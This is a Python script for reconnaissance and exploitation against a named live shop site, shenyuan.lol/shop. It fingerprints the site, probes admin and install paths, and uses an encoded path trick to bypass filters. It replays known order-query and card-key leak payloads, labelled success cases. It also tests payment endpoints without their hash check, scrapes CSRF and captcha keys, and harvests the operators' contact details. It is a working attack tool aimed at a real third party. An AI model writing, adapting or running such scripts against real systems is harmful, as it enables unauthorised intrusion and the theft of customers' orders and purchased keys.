#!/usr/bin/env python3
# shenyuan.lol — SUCCESS_CASES first + rainbow /shop/ recon
import re, subprocess, json, time, hashlib, html as htmlmod
from pathlib import Path
from urllib.parse import quote, urlencode

BASE='https://shenyuan.lol/shop'
HOST='shenyuan.lol'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
OUT=Path('/tmp/shenyuan_out'); OUT.mkdir(exist_ok=True)
LOG=[]

def log(*a):
    s=' '.join(str(x) for x in a)
    print(s, flush=True); LOG.append(s)

class Jar:
    def __init__(self): self.c={}
    def header(self): return '; '.join(f'{k}={v}' for k,v in self.c.items())
    def absorb(self, hdr):
        for line in hdr.splitlines():
            if line.lower().startswith('set-cookie:'):
                part=line.split(':',1)[1].strip().split(';')[0]
                if '=' in part:
                    k,v=part.split('=',1); self.c[k.strip()]=v.strip()
jar=Jar()

def curl(path, method='GET', data=None, headers=None, follow=False, t=40, base=BASE):
    cmd=['curl','-sk','-D','-','--max-time',str(t),'-A',UA,'-H',f'Referer: {BASE}/']
    if follow: cmd.append('-L')
    else: cmd += ['--max-redirs','0']
    if jar.c: cmd += ['-H', f'Cookie: {jar.header()}']
    if headers:
        for k,v in headers.items(): cmd += ['-H', f'{k}: {v}']
    url = path if path.startswith('http') else (base.rstrip('/') + '/' + path.lstrip('/') if not path.startswith('/') else 'https://'+HOST+path)
    # path relative to BASE if starts without http and looks like ?mod or ajax
    if not path.startswith('http') and not path.startswith('/'):
        url = BASE.rstrip('/') + '/' + path
    elif not path.startswith('http') and path.startswith('/shop'):
        url = 'https://'+HOST+path
    elif not path.startswith('http') and path.startswith('/'):
        url = 'https://'+HOST+path
    if method=='POST':
        cmd += ['-X','POST','-H','Content-Type: application/x-www-form-urlencoded','--data-binary', data or '']
    cmd.append(url)
    p=subprocess.run(cmd, capture_output=True, timeout=t+15)
    text=(p.stdout or b'').decode('utf-8','replace')
    if '\r\n\r\n' in text: hdr,body=text.split('\r\n\r\n',1)
    else: hdr,body=text,''
    jar.absorb(hdr)
    code_m=re.search(r'HTTP/\S+\s+(\d+)', hdr)
    code=int(code_m.group(1)) if code_m else 0
    loc_m=re.search(r'(?im)^location:\s*(.+)$', hdr)
    loc=loc_m.group(1).strip() if loc_m else ''
    return code, hdr, body, loc

xhr={'X-Requested-With':'XMLHttpRequest'}

# warm session
code,hdr,body,loc=curl('/shop/', follow=True)
log('HOME', code, 'len', len(body), 'title', re.search(r'<title>([^<]+)', body).group(1) if re.search(r'<title>', body) else None)
(OUT/'home.html').write_text(body[:200000])

# fingerprint
for pat in ['yxts','hashsalt','csrf_token','gt=','geetest','彩虹','发卡','SYS_KEY','mod=buy','mod=query']:
    log(f'has[{pat}]', pat in body or pat.lower() in body.lower())
# extract site name, contacts
for m in re.finditer(r'(sitename|title|kfqq|qq|telegram|tg)["\']?\s*[:=]\s*["\']([^"\']+)', body, re.I):
    log('META', m.group(1), m.group(2)[:80])
title=re.search(r'<title>([^<]+)', body)
log('TITLE', title.group(1) if title else None)
# version hints
for m in re.finditer(r'(build|version|yxts)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9._-]+)', body, re.I):
    log('VER', m.group(1), m.group(2))

log('===== GETCOUNT / PATHS =====')
code,hdr,body,loc=curl('/shop/ajax.php?act=getcount', method='POST', data='', headers=xhr)
log('GETCOUNT', body[:500])
(OUT/'getcount.json').write_text(body)
try: gc=json.loads(body)
except: gc={}

paths=[
 '/shop/','/shop/api.php','/shop/%61pi.php','/shop/ajax.php','/shop/?mod=query','/shop/?mod=buy&tid=1',
 '/shop/?mod=faka','/shop/includes/','/shop/admin/','/shop/install/','/shop/other/getshop.php',
 '/shop/getshop.php','/shop/cron.php','/shop/toollogs.php','/user/order/Query_Km','/',
]
for p in paths:
    code,hdr,body,loc=curl(p)
    sn=body[:80].replace('\n',' ')
    log(f'P {code} {p} loc={loc[:50]} sn={sn}')
    time.sleep(0.25)

log('===== SUCCESS_CASES =====')
# 1 qd93
for q in ['1','12','123','2026','202608','20260803','a','test']:
    code,hdr,body,loc=curl(f'/shop/?mod=query&data={quote(q)}')
    faka='mod=faka' in body or 'showOrder' in body or '卡密' in body
    log(f'QD93 data={q} code={code} len={len(body)} faka={faka} sn={body[:120].replace(chr(10)," ")}')
    if q=='1': (OUT/'qd93_1.html').write_text(body[:100000])
    time.sleep(0.3)

# 2 api search
for basep in ['/shop/api.php','/shop/%61pi.php']:
    for i in [1,2,10,100,1000]:
        code,hdr,body,loc=curl(f'{basep}?act=search&id={i}', headers=xhr)
        log(f'SEARCH {basep} id={i} code={code} body={body[:200].replace(chr(10)," ")}')
        time.sleep(0.25)
    code,hdr,body,loc=curl(f'{basep}?act=search', method='POST', data='id=1', headers=xhr)
    log(f'SEARCH_POST {basep} {body[:200].replace(chr(10)," ")}')

# 3 YKFAKA
for p in ['/user/order/Query_Km','/index/order/Query_Km','/shop/user/order/Query_Km']:
    code,hdr,body,loc=curl(p, method='POST', data='value=null')
    km=len(re.findall(r'Query_Km', body))
    log(f'YK {p} code={code} len={len(body)} km_links={km}')
    time.sleep(0.3)

log('===== AJAX ORACLES =====')
acts={
 'getcount':'',
 'query':'querytype=2&qq=1&pwd=',
 'query2':'type=1&qq=20260803120000000',
 'pay':'tid=1&inputvalue=test1&num=1',
 'get':'page=1&limit=5',
 'card_check':'card=test',
 'captcha':'',
 'gettool':'',
 'siteinfo':'',
 'changelogs':'',
}
# fix query keys
for a,data in [('getcount',''),('query','querytype=2&qq=1&pwd='),('query','type=1&qq=20260803120000000'),
              ('pay','tid=1&inputvalue=test1&num=1'),('card_check','card=test'),('captcha',''),
              ('gettool',''),('siteinfo',''),('changelogs',''),('gift_start',''),
              ('orders','page=1&limit=2')]:
    code,hdr,body,loc=curl(f'/shop/ajax.php?act={a}', method='POST', data=data, headers=xhr)
    log(f'A {a} [{data[:40]}] {body[:240].replace(chr(10)," ")}')
    time.sleep(0.3)

# api.php acts common
for act,data in [('getcount',''),('goodslist',''),('classlist',''),('siteinfo',''),
                 ('tools','key='),('token','key=test'),('clone','key=test'),
                 ('search','id=1'),('pay','tid=1')]:
    for basep in ['/shop/api.php','/shop/%61pi.php']:
        code,hdr,body,loc=curl(f'{basep}?act={act}', method='POST', data=data, headers=xhr)
        if code!=404:
            log(f'API {basep} {act}: {body[:200].replace(chr(10)," ")}')
        elif act=='getcount':
            log(f'API {basep} getcount 404')
        time.sleep(0.2)

log('===== GOODS / BUY PAGE =====')
# parse goods from home or goodslist
code,hdr,body,loc=curl('/shop/%61pi.php?act=goodslist', method='POST', data='', headers=xhr)
log('GOODSLIST', body[:800])
(OUT/'goodslist.json').write_text(body)
code,hdr,body,loc=curl('/shop/%61pi.php?act=classlist', method='POST', data='', headers=xhr)
log('CLASSLIST', body[:500])
code,hdr,body,loc=curl('/shop/%61pi.php?act=siteinfo', method='POST', data='', headers=xhr)
log('SITEINFO', body[:800])
(OUT/'siteinfo.json').write_text(body)

# buy page tid=1
code,hdr,body,loc=curl('/shop/?mod=buy&tid=1')
log('BUY1', code, len(body), 'hashsalt', 'hashsalt' in body, 'csrf', 'csrf_token' in body)
(OUT/'buy1.html').write_text(body[:150000])
# extract hashsalt js / csrf
csrf=re.search(r'name="csrf_token"[^>]*value="([^"]+)"', body)
log('CSRF', csrf.group(1) if csrf else None)
# geetest gt
for m in re.finditer(r'gt["\']?\s*[:=]\s*["\']([a-f0-9]{32})', body):
    log('GT', m.group(1))
code,hdr,cbody,loc=curl('/shop/ajax.php?act=captcha', method='POST', data='', headers=xhr)
log('CAPTCHA', cbody[:300])

log('===== QUERY VARIANTS =====')
for data in [
 'querytype=1&qq=1',
 'querytype=2&qq=1&pwd=',
 'type=1&qq=1',
 'type=2&qq=1',
 'orderid=20260803120000000',
 'qq=20260803120000000',
]:
    code,hdr,body,loc=curl('/shop/ajax.php?act=query', method='POST', data=data, headers=xhr)
    log(f'Q [{data}] {code} {body[:220].replace(chr(10)," ")}')
    time.sleep(0.3)

# qqq.lc style - does query leak?
code,hdr,body,loc=curl('/shop/ajax.php?act=query', method='POST', data='querytype=1&qq=1&page=1', headers=xhr)
log('Q_QQ1', body[:500])
(OUT/'query_qq1.json').write_text(body)

log('===== PAY PROBE =====')
# try pay without hashsalt first
for tid in [1,2]:
    code,hdr,body,loc=curl('/shop/ajax.php?act=pay', method='POST', data=f'tid={tid}&inputvalue=recon1&num=1', headers=xhr)
    log(f'PAY_RAW tid={tid}', body[:300].replace('\n',' '))
    time.sleep(0.4)

# if buy page has hashsalt JSFuck - try extract like other shops
buy=(OUT/'buy1.html').read_text(encoding='utf-8',errors='ignore')
# look for hashsalt assignment
hm=re.search(r'hashsalt["\']?\s*[:=]\s*["\']([a-f0-9]{32})["\']', buy)
log('HASH_PLAIN', hm.group(1) if hm else None)
# contacts from home
home=(OUT/'home.html').read_text(encoding='utf-8',errors='ignore')
for pat in [r't\.me/[a-zA-Z0-9_]+', r'@[a-zA-Z0-9_]{4,}', r'kfqq["\']?\s*[:=]\s*["\']?(\d+)', r'QQ[：:]\s*(\d+)']:
    ms=re.findall(pat, home)
    if ms: log('CONTACT', pat, ms[:5])

(OUT/'recon.log').write_text('\n'.join(LOG))
(OUT/'jar.txt').write_text(jar.header())
log('DONE jar', jar.header()[:120])
